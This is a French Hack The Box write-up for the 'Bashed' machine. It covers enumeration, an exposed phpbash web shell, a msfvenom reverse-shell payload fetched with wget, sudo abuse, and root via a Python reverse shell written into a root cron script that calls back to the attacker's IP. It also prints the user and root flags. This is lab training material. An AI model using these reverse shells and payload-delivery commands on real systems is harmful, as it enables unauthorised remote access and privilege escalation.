---
title: HTB | Bashed
description: Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted, ...
slug: bashed-htb
date: 2025-01-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Bashed cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Bashed</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.68</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sC -sV -An -p- 10.10.10.68
...
80 -> HTTP : http://bashed.htb
```

## Foothold

### gobuster: found dev/ folder
```bash
$ gobuster dir -u http://bashed.htb -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bashed.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]
/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/]
/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/]
/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]
/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/]
/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]
/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/]
/server-status        (Status: 403) [Size: 298]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

### phpbash.php: www-data and arrexel user
Dans le dossier dev/, on peut executer un script phpbash.php qui donne litteralement une session bash interactive en tant que www-data sur la machine :
```bash
http://bashed.htb/dev/phpbash.php

www-data@bashed:/# cd home/

www-data@bashed:/home# ls

arrexel
scriptmanager
www-data@bashed:/home# cd arrexel

www-data@bashed:/home/arrexel# ls

user.txt
www-data@bashed:/home/arrexel# cat user.txt

aef2caa5e32fc08bfaa0982ec46c8071
```

### Users
```bash
cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

### Reverse shell : msfvenom
Avec msfvenom, pour s'entrainer :
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=1337 -f elf -o test.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: test.elf
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.68 - - [11/Jan/2025 19:11:27] "GET /test.elf HTTP/1.1" 200 -

------------------------------------------

$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.68] 54598

python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@bashed:/tmp$ export TERM=xterm
export TERM=xterm
www-data@bashed:/tmp$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/Bashed]
└─$ stty raw -echo; fg
[3]    continued  nc -lnvp 1337

www-data@bashed:/tmp$ whoami
www-data

---------------------------------------------

wget 10.10.14.42:8888/test.elf

--2025-01-11 16:18:10-- http://10.10.14.42:8888/test.elf
Connecting to 10.10.14.42:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: 'test.elf'

0K 100% 40.5M=0s

2025-01-11 16:18:10 (40.5 MB/s) - 'test.elf' saved [194/194]

www-data@bashed:/tmp# chmod 777 ./test.elf

www-data@bashed:/tmp# ls -la test.elf

-rwxrwxrwx 1 www-data www-data 194 Jan 11 16:10 test.elf
www-data@bashed:/tmp# ./test.elf &
```

## www-data -> scriptmanager

### Enumeration : sudo -l
On découvre qu'on peut executer n'importe quelle commande, en tant que l'utilisateur scriptmanager sans mot de passe !
```bash
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### shell as scriptmanager
On ouvre donc un bash en tant que scriptmanager :
```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
```

## scriptmanager -> root

### LinPEAS : /scripts folder
Avec linpeas, on découvre un dossier suspect "/scripts" à la racine, créer par le user `scriptmanager`.

On découvre qu'il contient deux fichiers :
```bash
scriptmanager@bashed:/scripts$ ls -l
total XX
-rw-r--r-- 1 scriptmanager scriptmanager 206 Jan 12 14:37 test.py
-rw-r--r-- 1 root          root           12 Jan 12 13:25 test.txt
```
Dans test.py, on peut voir une commande qui ecrit dans un fichier test.txt une string "hello". Ce fichier existe deja, donc le script a été executé auparavant. Comme le fichier semble avoir été crée par root, on déduit que root a executé ce script python. On suppose donc que ce fichier est potentiellement un script de test executé régulièrement par root, dans une crontab. On modifie donc le fichier test.py avec un reverse shell trouvé sur le site reverse shell generator :
https://www.revshells.com/
```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.42",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

-----------------------------

nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.68] 42276
## whoami
whoami
root
## cat /root/root.txt
cat /root/root.txt
4600bb18c83173fff6f9e174913978e4
```

